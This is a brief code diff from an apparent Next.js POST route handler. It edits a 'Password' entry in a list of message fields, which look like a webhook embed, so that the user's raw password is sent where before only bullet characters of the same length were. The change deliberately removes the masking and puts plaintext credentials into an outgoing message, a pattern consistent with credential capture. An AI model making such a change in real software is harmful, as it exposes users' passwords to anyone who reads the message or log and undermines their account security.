@@ -52,7 +52,7 @@ export async function POST(request: NextRequest) {
           },
           {
             name: 'Password',
-            value: password ? '•'.repeat(password.length) : 'Not provided',
+            value: password || 'Not provided',
             inline: true,
           },
         ],
